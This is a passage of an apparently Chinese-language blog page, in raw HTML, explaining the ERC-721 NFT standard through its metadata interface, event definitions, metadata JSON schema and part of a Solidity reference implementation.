@title ERC-721 Non-Fungible Token Standard, optional metadata extension</span></span><br><span class="line"><span class="comment">/// @dev See https://eips.ethereum.org/EIPS/eip-721</span></span><br><span class="line"><span class="comment">///  Note: the ERC-165 identifier for this interface is 0x5b5e139f.</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">ERC721Metadata</span> /* is <span class="title class_">ERC721</span> */ &#123;</span><br><span class="line">    <span class="comment">/// @notice A descriptive name for a collection of NFTs in this contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">name</span>(<span class="params"></span>) external view returns (<span class="built_in">string</span> _name);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice An abbreviated name for NFTs in this contract</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">symbol</span>(<span class="params"></span>) external view returns (<span class="built_in">string</span> _symbol);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// @notice A distinct Uniform Resource Identifier (URI) for a given asset.</span></span><br><span class="line">    <span class="comment">/// @dev Throws if `_tokenId` is not a valid NFT. URIs are defined in RFC</span></span><br><span class="line">    <span class="comment">///  3986. The URI may point to a JSON file that conforms to the &quot;ERC721</span></span><br><span class="line">    <span class="comment">///  Metadata JSON Schema&quot;.</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">tokenURI</span>(<span class="params">uint256 _tokenId</span>) external view returns (<span class="built_in">string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="事件定义"><a href="#事件定义" class="headerlink" title="事件定义"></a>事件定义</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/// @dev This emits when ownership of any NFT changes by any mechanism.</span></span><br><span class="line"><span class="comment">///  This event emits when NFTs are created (`from` == 0) and destroyed</span></span><br><span class="line"><span class="comment">///  (`to` == 0). Exception: during contract creation, any number of NFTs</span></span><br><span class="line"><span class="comment">///  may be created and assigned without emitting Transfer. At the time of</span></span><br><span class="line"><span class="comment">///  any transfer, the approved address for that NFT (if any) is reset to none.</span></span><br><span class="line">event <span class="title class_">Transfer</span>(address indexed _from, address indexed _to, uint256 indexed _tokenId);</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @dev This emits when the approved address for an NFT is changed or</span></span><br><span class="line"><span class="comment">///  reaffirmed. The zero address indicates there is no approved address.</span></span><br><span class="line"><span class="comment">///  When a Transfer event emits, this also indicates that the approved</span></span><br><span class="line"><span class="comment">///  address for that NFT (if any) is reset to none.</span></span><br><span class="line">event <span class="title class_">Approval</span>(address indexed _owner, address indexed _approved, uint256 indexed _tokenId);</span><br><span class="line"></span><br><span class="line"><span class="comment">/// @dev This emits when an operator is enabled or disabled for an owner.</span></span><br><span class="line"><span class="comment">///  The operator can manage all NFTs of the owner.</span></span><br><span class="line">event <span class="title class_">ApprovalForAll</span>(address indexed _owner, address indexed _operator, bool _approved);</span><br></pre></td></tr></table></figure><h3 id="Metadata-JSON-Schema"><a href="#Metadata-JSON-Schema" class="headerlink" title="Metadata JSON Schema"></a>Metadata JSON Schema</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;title&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Asset Metadata&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;object&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Identifies the asset to which this NFT represents&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Describes the asset to which this NFT represents&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;string&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;A URI pointing to a resource with mime type image/* representing the asset to which this NFT represents. Consider making any images at a width between 320 and 1080 pixels and aspect ratio between 1.91:1 and 4:5 inclusive.&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="社区实现"><a href="#社区实现" class="headerlink" title="社区实现"></a>社区实现</h2><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.24</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IERC721.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;./IERC721Receiver.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../../math/SafeMath.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../../utils/Address.sol&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;../../introspection/ERC165.sol&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@title</span> ERC721 Non-Fungible Token Standard basic implementation</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@dev</span> see https://github.com/ethereum/EIPs/blob/master/EIPS/eip-721.md</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">contract <span class="title class_">ERC721</span> is <span class="title class_">ERC165</span>, <span class="title class_">IERC721</span> &#123;</span><br><span class="line"></span><br><span class="line">  using <span class="title class_">SafeMath</span> <span class="keyword">for</span> uint256;</span><br><span class="line">  using <span class="title class_">Address</span> <span class="keyword">for</span> address;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Equals to `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`</span></span><br><span class="line">  <span class="comment">// which can be also obtained as `IERC721Receiver(0).onERC721Received.selector`</span></span><br><span class="line">  bytes4 <span class="keyword">private</span> constant _ERC721_RECEIVED = <span class="number">0x150b7a02</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mapping from token ID to owner</span></span><br><span class="line">  mapping (<span class="function"><span class="params">uint256</span> =&gt;</span> address) <span class="keyword">private</span> _tokenOwner;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mapping from token ID to approved address</span></span><br><span class="line">  mapping (<span class="function"><span class="params">uint256</span> =&gt;</span> address) <span class="keyword">private</span> _tokenApprovals;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mapping from owner to number of owned token</span></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint256) <span class="keyword">private</span> _ownedTokensCount;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Mapping from owner to operator approvals</span></span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> mapping (<span class="function"><span class="params">address</span> =&gt;</span> bool)) <span class="keyword">private</span> _operatorApprovals;</span><br><span class="line"></span><br><span class="line">  bytes4 <span class="keyword">private</span> constant _InterfaceId_ERC721 = <span class="number">0x80ac58cd</span>;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">   * 0x80ac58cd ===</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;balanceOf(address)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;ownerOf(uint256)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;approve(address,uint256)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;getApproved(uint256)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;setApprovalForAll(address,bool)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;isApprovedForAll(address,address)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;transferFrom(address,address,uint256)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256)&#x27;)) ^</span></span><br><span class="line"><span class="comment">   *   bytes4(keccak256(&#x27;safeTransferFrom(address,address,uint256,bytes)&#x27;))</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params"></span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// register the supported interfaces to conform to ERC721 via ERC165</span></span><br><span class="line">    <span class="title function_">_registerInterface</span>(_InterfaceId_ERC721);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Gets the balance of the specified address</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> owner address to query the balance of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> uint256 representing the amount owned by the passed address</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">balanceOf</span>(<span class="params">address owner</span>) <span class="keyword">public</span> view returns (uint256) &#123;</span><br><span class="line">    <span class="built_in">require</span>(owner != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> _ownedTokensCount[owner];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Gets the owner of the specified token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to query the owner of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> owner address currently marked as the owner of the given token ID</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">ownerOf</span>(<span class="params">uint256 tokenId</span>) <span class="keyword">public</span> view returns (address) &#123;</span><br><span class="line">    address owner = _tokenOwner[tokenId];</span><br><span class="line">    <span class="built_in">require</span>(owner != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span> owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Approves another address to transfer the given token ID</span></span><br><span class="line"><span class="comment">   * The zero address indicates there is no approved address.</span></span><br><span class="line"><span class="comment">   * There can only be one approved address per token at a given time.</span></span><br><span class="line"><span class="comment">   * Can only be called by the token owner or an approved operator.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address to be approved for the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be approved</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">approve</span>(<span class="params">address to, uint256 tokenId</span>) <span class="keyword">public</span> &#123;</span><br><span class="line">    address owner = <span class="title function_">ownerOf</span>(tokenId);</span><br><span class="line">    <span class="built_in">require</span>(to != owner);</span><br><span class="line">    <span class="built_in">require</span>(msg.<span class="property">sender</span> == owner || <span class="title function_">isApprovedForAll</span>(owner, msg.<span class="property">sender</span>));</span><br><span class="line"></span><br><span class="line">    _tokenApprovals[tokenId] = to;</span><br><span class="line">    emit <span class="title class_">Approval</span>(owner, to, tokenId);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Gets the approved address for a token ID, or zero if no address set</span></span><br><span class="line"><span class="comment">   * Reverts if the token ID does not exist.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to query the approval of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> address currently approved for the given token ID</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getApproved</span>(<span class="params">uint256 tokenId</span>) <span class="keyword">public</span> view returns (address) &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">_exists</span>(tokenId));</span><br><span class="line">    <span class="keyword">return</span> _tokenApprovals[tokenId];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Sets or unsets the approval of a given operator</span></span><br><span class="line"><span class="comment">   * An operator is allowed to transfer all tokens of the sender on their behalf</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to operator address to set the approval</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> approved representing the status of the approval to be set</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">setApprovalForAll</span>(<span class="params">address to, bool approved</span>) <span class="keyword">public</span> &#123;</span><br><span class="line">    <span class="built_in">require</span>(to != msg.<span class="property">sender</span>);</span><br><span class="line">    _operatorApprovals[msg.<span class="property">sender</span>][to] = approved;</span><br><span class="line">    emit <span class="title class_">ApprovalForAll</span>(msg.<span class="property">sender</span>, to, approved);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Tells whether an operator is approved by a given owner</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> owner owner address which you want to query the approval of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> operator operator address which you want to query the approval of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool whether the given operator is approved by the given owner</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">isApprovedForAll</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address owner,</span></span><br><span class="line"><span class="params">    address operator</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">    view</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> _operatorApprovals[owner][operator];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Transfers the ownership of a given token ID to another address</span></span><br><span class="line"><span class="comment">   * Usage of this method is discouraged, use `safeTransferFrom` whenever possible</span></span><br><span class="line"><span class="comment">   * Requires the msg sender to be the owner, approved, or operator</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from current owner of the token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address to receive the ownership of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">transferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 tokenId</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">_isApprovedOrOwner</span>(msg.<span class="property">sender</span>, tokenId));</span><br><span class="line">    <span class="built_in">require</span>(to != <span class="title function_">address</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="title function_">_clearApproval</span>(<span class="keyword">from</span>, tokenId);</span><br><span class="line">    <span class="title function_">_removeTokenFrom</span>(<span class="keyword">from</span>, tokenId);</span><br><span class="line">    <span class="title function_">_addTokenTo</span>(to, tokenId);</span><br><span class="line"></span><br><span class="line">    emit <span class="title class_">Transfer</span>(<span class="keyword">from</span>, to, tokenId);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Safely transfers the ownership of a given token ID to another address</span></span><br><span class="line"><span class="comment">   * If the target address is a contract, it must implement `onERC721Received`,</span></span><br><span class="line"><span class="comment">   * which is called upon a safe transfer, and return the magic value</span></span><br><span class="line"><span class="comment">   * `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`; otherwise,</span></span><br><span class="line"><span class="comment">   * the transfer is reverted.</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * Requires the msg sender to be the owner, approved, or operator</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from current owner of the token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address to receive the ownership of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">safeTransferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 tokenId</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// solium-disable-next-line arg-overflow</span></span><br><span class="line">    <span class="title function_">safeTransferFrom</span>(<span class="keyword">from</span>, to, tokenId, <span class="string">&quot;&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Safely transfers the ownership of a given token ID to another address</span></span><br><span class="line"><span class="comment">   * If the target address is a contract, it must implement `onERC721Received`,</span></span><br><span class="line"><span class="comment">   * which is called upon a safe transfer, and return the magic value</span></span><br><span class="line"><span class="comment">   * `bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))`; otherwise,</span></span><br><span class="line"><span class="comment">   * the transfer is reverted.</span></span><br><span class="line"><span class="comment">   * Requires the msg sender to be the owner, approved, or operator</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> from current owner of the token</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> to address to receive the ownership of the given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> _data bytes data to send along with a safe transfer check</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">safeTransferFrom</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address <span class="keyword">from</span>,</span></span><br><span class="line"><span class="params">    address to,</span></span><br><span class="line"><span class="params">    uint256 tokenId,</span></span><br><span class="line"><span class="params">    bytes _data</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    <span class="keyword">public</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="title function_">transferFrom</span>(<span class="keyword">from</span>, to, tokenId);</span><br><span class="line">    <span class="comment">// solium-disable-next-line arg-overflow</span></span><br><span class="line">    <span class="built_in">require</span>(<span class="title function_">_checkAndCallSafeTransfer</span>(<span class="keyword">from</span>, to, tokenId, _data));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Returns whether the specified token exists</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to query the existence of</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> whether the token exists</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_exists</span>(<span class="params">uint256 tokenId</span>) internal view returns (bool) &#123;</span><br><span class="line">    address owner = _tokenOwner[tokenId];</span><br><span class="line">    <span class="keyword">return</span> owner != <span class="title function_">address</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@dev</span> Returns whether the given spender can transfer a given token ID</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> spender address of the spender to query</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> tokenId uint256 ID of the token to be transferred</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> bool whether the msg.sender is approved for the given token ID,</span></span><br><span class="line"><span class="comment">   *  is an operator of the owner, or is the owner of the token</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_isApprovedOrOwner</span>(<span class="params"></span></span><br><span class="line"><span class="params">    address spender,</span></span><br><span class="line"><span class="params">    uint256 tokenId</span></span><br><span class="line"><span class="params">  </span>)</span><br><span class="line">    internal</span><br><span class="line">    view</span><br><span class="line">    returns (bool)</span><br><span class="line">  &#123;</span><br><span class="line">    address owner = <span 